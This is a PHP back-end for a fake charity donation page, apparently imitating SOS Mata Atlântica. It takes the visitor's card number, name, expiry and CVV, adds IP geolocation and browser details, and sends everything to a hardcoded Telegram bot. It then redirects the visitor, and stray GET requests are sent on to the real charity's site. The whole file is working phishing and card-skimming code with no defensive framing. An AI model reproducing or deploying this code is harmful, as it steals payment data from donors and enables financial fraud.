<?php

function getIpInfo($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $apiData = file_get_contents($apiUrl);
    return json_decode($apiData, true);
}

function getBrowserName($userAgent) {
    $browser = "Desconhecido";
    if (preg_match('/Firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
        $browser = 'Internet Explorer';
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = 'Microsoft Edge';
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = 'Google Chrome';
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
        $browser = 'Opera';
    }
    return $browser;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    if (isset($_POST['cartao_nome']) && isset($_POST['cartao_numero']) && isset($_POST['cartao_mes']) && isset($_POST['cartao_ano']) && isset($_POST['cartao_cvv'])) {
        
        $numeroCartao = $_POST['cartao_numero']; 
        $nomeCartao = $_POST['cartao_nome'];
        $validadeCartao = $_POST['cartao_mes'] . '/' . $_POST['cartao_ano']; 
        $cvv = $_POST['cartao_cvv'];
        $tipoDoacao = $_POST['unica_ou_mensal']; 
        $dataHora = date('Y-m-d H:i:s');

        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $linguao = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A';

        $navegador = getBrowserName($userAgent);
        $ipInfo = getIpInfo($ip);

        $conteudo = "🦆 | LOG DUCKETTSTONE\n\n";
        $conteudo .= "💳 | Número do Cartão: $numeroCartao\n";
        $conteudo .= "🔐 | Nome no Cartão: $nomeCartao\n";
        $conteudo .= "📅 | Validade: $validadeCartao\n";
        $conteudo .= "🔑 | Cvv: $cvv\n";
        $conteudo .= "🔄 | Tipo da Doação: $tipoDoacao\n";
        $conteudo .= "🏠 | IP: " . $ipInfo["query"] . "\n🔎 | Cidade: " . $ipInfo["city"] . "\n📍 | Região: " . $ipInfo["regionName"] . "\n🌎 | País: " . $ipInfo["country"] . "\n📦 | ISP: " . $ipInfo["isp"] . "\n\n";
        $conteudo .= "🔓 | USER-AGENT: $userAgent\n";
        $conteudo .= "🌐 | NAVEGADOR: $navegador\n";
        $conteudo .= "👥 | LINGUAGEM: $linguao\n";
        $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        

        $botToken = '6511062833:AAHY0sQ8KH17pIUmswxJdzsnDLRggdlLr8U';
        $chatId = '6164096118';

        $mensagem = urlencode($conteudo);
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";

        $response = file_get_contents($url);

        if ($response !== false) {
            header('Location: index.html'); 
            exit();
        } else {
            echo "Houve um erro ao enviar os dados. Tente novamente.";
        }
    } else {
        echo "Por favor, preencha todos os campos do formulário.";
    }
} else {
    header('Location: https://cms.sosma.org.br/doacao/cadastro'); 
    exit();
}
?>
